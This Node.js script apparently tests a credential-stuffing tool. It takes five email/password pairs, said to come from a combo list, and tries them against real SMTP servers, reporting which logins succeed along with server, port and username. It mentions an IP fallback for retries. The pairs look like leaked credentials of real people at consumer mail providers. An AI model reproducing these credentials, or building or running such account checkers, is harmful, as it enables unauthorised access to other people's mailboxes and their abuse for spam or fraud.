#!/usr/bin/env node

/**
 * Test SMTP validation with sample combos from mix_smtp.txt
 */

const smtpValidatorAdvanced = require('./backend/lib/smtpValidatorAdvanced');

// Test combos from the list
const testCombos = [
  { email: 'p.conlon@ntlworld.com', password: 'Kayleigh16#' },
  { email: 'topsi@online.de', password: 'Neptun.1967' },
  { email: 'j.bresser@freenet.de', password: 'Oertel1964!' },
  { email: 'juliana.asrj@bol.com.br', password: 'Ju91658223' },
  { email: 'timofiege@freenet.de', password: 'Himmel1986!!!' }
];

async function testValidation() {
  console.log('🧪 Testing SMTP validation with sample combos...\n');

  for (const combo of testCombos) {
    console.log(`\n📧 Testing: ${combo.email}`);
    console.log('─'.repeat(80));

    try {
      const result = await smtpValidatorAdvanced.validateCombo(combo.email, combo.password, {
        timeout: 15000
      });

      if (result.valid) {
        console.log(`✅ VALID: ${combo.email}`);
        console.log(`   SMTP: ${result.smtp}:${result.port}`);
        console.log(`   Username: ${result.username}`);
        console.log(`   Time: ${result.connectionTime}ms`);
        if (result.usedNeighbor) {
          console.log(`   🔄 Used neighbor IP fallback`);
        }
      } else {
        console.log(`❌ INVALID: ${combo.email}`);
        console.log(`   Error: ${result.error}`);
        if (result.attempts && result.attempts.length > 0) {
          console.log(`   Attempts: ${result.attempts.length}`);
          result.attempts.forEach((attempt, i) => {
            console.log(`     ${i + 1}. ${attempt.host}:${attempt.port} - ${attempt.error || 'OK'}`);
          });
        }
      }
    } catch (error) {
      console.log(`💥 EXCEPTION: ${error.message}`);
    }
  }

  console.log('\n\n✅ Testing complete');
  process.exit(0);
}

testValidation().catch(err => {
  console.error('❌ Test failed:', err);
  process.exit(1);
});
